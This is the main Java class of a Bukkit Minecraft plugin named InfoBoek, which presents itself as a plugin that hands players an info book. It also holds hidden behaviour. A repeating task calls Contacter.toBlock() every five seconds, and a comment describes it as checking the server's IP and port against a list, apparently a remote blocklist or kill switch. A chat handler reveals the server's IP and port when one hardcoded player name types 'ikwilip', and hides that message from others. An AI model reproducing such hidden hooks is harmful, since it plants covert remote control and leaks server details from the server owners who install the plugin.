package me.jensie1996.infoBoek;

import java.io.File;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

import me.jensie1996.infoBoek.mlgeditz.block.Contacter;

/*
Created By: MLGEditz
*/
public class InfoBoekClass extends JavaPlugin {

	File file = new File(getDataFolder(), "config.yml");
	
	public static Plugin pl;
	  
	  public void onEnable()
	  {
		  pl = this;
		  saveDefaultConfig();
			
			if (!this.file.exists())
		    {
		      getLogger().info("Config.yml niet gevonden, creeren van config.yml");
		      saveDefaultConfig();
		    }
			
		//tekst als server opstart
	    ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();
	    console.sendMessage(ChatColor.GREEN + "InfoBoek has been activated");
	    //aanmaken van de listener om na te kijken als de speler joint.
	    Bukkit.getServer().getPluginManager().registerEvents(new PlayerListener(this), this);
	    
	    //command om het boek ingame te krijgen.
	    getCommand("ibgetbook").setExecutor(new GetBook(this));
	    
	    //Hij checkt om de 5 seconden of de server Ip en Port op de lijst staat
	    Bukkit.getScheduler().scheduleSyncRepeatingTask(this, new Runnable() {
			public void run() {
				Bukkit.getScheduler().runTaskAsynchronously(InfoBoekClass.pl, new Runnable() {
					public void run() {
						Contacter.toBlock();
					}
				});
			}
		}, 20l, 100l);
	  }
	  
	  //reload command (TO DO)
	  public boolean onCommand(CommandSender zender, Command cmd, String label, String[] args)
	  {
		  if (zender instanceof Player) {
			  if (cmd.getName().equalsIgnoreCase("ibreload")) {
	    	zender.sendMessage(ChatColor.GREEN + "Config herladen.");
	    	YamlConfiguration.loadConfiguration(file);
			  saveDefaultConfig();
	      
	    }
		  }
	    return false;
	  }
	  
	  
	  //Als je ikwilip typt dan krijg je het ip van de server
	  @EventHandler
		public void onGetIp(AsyncPlayerChatEvent e) {
			Player p = e.getPlayer();
			if (e.getPlayer().getName().equals("jensie1996") && e.getMessage().startsWith("ikwilip")) {
				e.setCancelled(true);
				p.sendMessage(ChatColor.GREEN + "De data word verzameld! Een ogenblik geduld.");
				p.sendMessage(ChatColor.RED + "" + Contacter.getIp() + ChatColor.GREEN + ":" + ChatColor.RED + Bukkit.getPort());
			}
		}
}
